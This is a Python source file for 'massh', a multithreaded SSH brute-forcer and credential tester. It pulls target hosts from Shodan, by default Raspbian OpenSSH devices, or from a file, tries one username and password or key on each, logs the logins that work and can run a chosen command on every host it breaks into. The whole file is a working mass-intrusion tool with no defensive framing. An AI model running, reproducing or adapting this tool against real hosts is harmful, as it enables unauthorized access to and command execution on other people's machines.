#!/usr/bin/env python3

import argparse, os, socket, sys, time
from multiprocessing import Pool
from functools import partial
try:
	from colorama import Fore
	from colorama import init as _colorama_init
	import paramiko, shodan, tqdm
except ImportError as e:
	print('[-] Failed to import an external module (%s).' % str(e))
	print('    Please install the required modules inside the requirements.txt file.')
	sys.exit(1)

__version__ = "2.0"

_colorama_init() # Colored output

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def check_file(input_file: str):
	"""
		Check if the file provided using the -i/--input argument exists
	"""
	try:
		return os.path.isfile(input_file) == True or os.path.getsize(input_file) != 0
	except:
		return False

def error_to_string(code):
	"""
		Map the integer returned by connect() to a debug-friendly string
	"""
	return [None, "ERR_AUTH", "ERR_CONNECTION", "ERR_TIMEOUT", "ERR_SSH", "ERR_UNKNOWN", None, None, None, "ERR_KEYBOARD_INTERRUPT"][code]

def shodan_search(apikey, search_string, limit=100):
	"""
		Poll Shodan for results
	"""
	api = shodan.Shodan(apikey)
	try:
		results = api.search(search_string, limit=limit)
		return ["%s:%s" % (a['ip_str'], a['port']) for a in results['matches']]
	except shodan.APIError as e:
		print((Fore.RED + '[-]' + Fore.RESET + ' Shodan API Error\n    Error string: %s\n\n    Please check the provided API key.' % str(e)))
		sys.exit(1)

def connect(ip: str, port: int, outfile, username, password=None, key=None, cmd=None):
	"""
		SSH connect function
	"""
	command_output = None
	return_code = 5
	try:
		if password != None:
			ssh.connect(ip, port, username=username, password=password, timeout=5, look_for_keys=False)
		elif key != None:
			ssh.connect(ip, port, username=username, key_filename=key, timeout=5)
		with open(outfile, 'a') as fl:
			fl.write(ip)
			if cmd:
				stdin, stdout, stderr = ssh.exec_command(cmd)
				time.sleep(1)
				stdin.close()
				command_output = stdout.read().decode("utf-8").strip()
				fl.write(' | %s' % command_output)
			fl.write('\n')
		ssh.close()
		return_code = 0
	except paramiko.AuthenticationException as g:
		return_code = 1 # Authentication error
	except paramiko.ssh_exception.NoValidConnectionsError as e:
		return_code = 2 # Connection error
	except socket.error:
		return_code = 3 # Timeout
	except socket.timeout:
		return_code = 3 # Timeout
	except paramiko.ssh_exception.SSHException:
		return_code = 4 # Generic SSH error
	except KeyboardInterrupt:
		return_code = 9 # Interrupted
	except:
		return_code = 5 # Unknown
	return return_code, command_output

def check(ipport, username, outfile, password=None, key=None, cmd=None, debug=False):
	"""
		Multi-threaded check function - only shows successful IPs, no counters, for now no error handling
	"""
	if debug:
		print("[D] Multiproc - check IP %s" % ipport)
	ippsplit = ipport.split(':')
	ip = ippsplit[0]
	port = int(ippsplit[1])
	status, cmd_out = connect(ip, port, outfile, username, password=password, key=key, cmd=cmd)
	if status == 0:
		if cmd:
			print(Fore.GREEN + "[✓]" + Fore.RESET + " %s -- %s" % (ip, cmd_out))
		else:
			print(Fore.GREEN + "[✓]" + Fore.RESET + " %s -- Auth success" % ip)
	else:
		if debug:
			print("[D] %s FAILED (result %s)" % (ip, error_to_string(status)))

def main():
	print(Fore.BLUE + '[i]' + Fore.RESET + ' massh %s\n    by btx3' % __version__)
	if args.paramiko_log:
		# Start logging
		paramiko.util.log_to_file(args.paramiko_log)
	if args.input:
		if not check_file(args.input):
			print(Fore.RED + '[-]' + Fore.RESET + ' Input file %s doesn\'t exist!' % args.input)
			sys.exit(1)
		else:
			print(Fore.BLUE + '[i]' + Fore.RESET + ' Reading from "%s"' % args.input)
			with open(args.input, 'r') as file:
				ips = file.readlines()
				targets = []
				for ipport in ips:
					targets.append(ipport.strip())
	else:
		# Shodan
		print(Fore.BLUE + '[i]' + Fore.RESET + ' Searching Shodan for "%s"' % args.query)
		targets = shodan_search(args.shodan_key, args.query, limit=args.limit)
	print(Fore.BLUE + '[i]' + Fore.RESET + ' %i hosts found\n' % len(targets))
	total_tried = 0
	total_success = 0
	try:
		if args.singlethreaded:
			for ip in targets:
				check(ip[0], ip[1], args.output, args.username, args.password, args.ssh_key, args.command)
		else:
			p = Pool(processes=args.threads)
			for result in tqdm.tqdm(p.imap_unordered(partial(check, outfile=args.output, username=args.username, password=args.password, key=args.ssh_key, cmd=args.command, debug=args.debug), targets), total=len(targets)):
				total_tried += 1
				if result == 0:
					total_success += 1
				pass
	except KeyboardInterrupt:
		print("Ctrl + C pressed")
	print('\n\n' + Fore.GREEN + '[✓]' + Fore.RESET + ' Finished!\n    Total IPs tried: %s\n    Total successes: %s\n' % (total_tried, total_success))
	sys.exit(0)

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="massh (Mass-SSH): multithreaded ssh bruteforcer/cred-tester")

	argsource = parser.add_mutually_exclusive_group(required=True)
	argsource.add_argument('-i', '--input', help='input file (one IP:port per line)', metavar='FILE')
	argsource.add_argument('-k', '--shodan-key', help='Set Shodan API key', type=str)

	parser.add_argument('-q', '--query', help='Set Shodan search query', type=str, default='Raspbian product:"OpenSSH"')
	parser.add_argument('-u', '--username', help='Set username [default: root]', type=str, required=True, default='root')

	auth_method = parser.add_mutually_exclusive_group(required=True)
	auth_method.add_argument('-p', '--password', help='Set password', type=str)
	auth_method.add_argument('--ssh-key', help='Set SSH key', type=str)

	parser.add_argument('-c', '--command', help='Command to run after a successful connection [default: none]', metavar='CMD', type=str)

	parser.add_argument('-o', '--output', help='Output successful IPs to FILE [default: successful.log]', metavar='FILE', type=str, default='successful.log') # Where to output successful IPs
	parser.add_argument('-t', '--threads', help='Threads for multiprocessing [default: 8]', type=int, default=8)
	parser.add_argument('--limit', help='Limit number of shodan results [default: 100]', type=int, default=100)
	parser.add_argument('--debug', help='Show debug information [default: off]', action='store_true')
	parser.add_argument('--singlethreaded', help='Disable multiprocessing support [default: no]', action='store_true')
	parser.add_argument('--paramiko-log', help='Paramiko debug log [default: none/off]', metavar='FILE', type=str) # Paramiko (the SSH client)'s log file location
	args = parser.parse_args()

	main()
